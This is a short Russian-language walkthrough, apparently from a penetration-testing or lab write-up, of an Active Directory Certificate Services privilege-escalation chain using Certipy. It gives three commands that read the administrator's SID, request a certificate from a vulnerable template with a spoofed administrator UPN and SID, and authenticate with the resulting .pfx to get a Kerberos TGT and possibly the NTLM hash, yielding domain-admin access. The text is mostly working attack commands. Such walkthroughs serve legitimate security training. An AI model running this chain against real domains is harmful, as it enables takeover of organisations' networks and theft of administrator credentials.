Цепочка атаки: 
я погуглил и нашел на гитхаб вот такую цепочку атаки: https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation
используем для начала команду чтобы найти SID для administrator
```
certipy account -u 'USERNAME' -p 'PASSWORD' -dc-ip 'DC_IP' -user 'administrator' read
```
а далее используем уже команду для самой атаки
```
certipy req \
    -u 'attacker@pentest.local' -p 'Passw0rd!' \
    -dc-ip 'DC_IP' -target 'CA.PENTEST.LOCAL' \
    -ca 'PENTEST.LOCAL-CA' -template 'ForClient' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
```
После чего получаем administrator.pfx и можем авторизироваться через dc
```
certipy auth -pfx 'administrator.pfx' -dc-ip 'DC_IP'
```
получаем успешно созданный Kerberos TGT для админа и если certipy сможет то вытащит еще и NTLM хэш пароля, а далее сохранится в administrator.ccache и соответственно получим доступ в домене как администратор
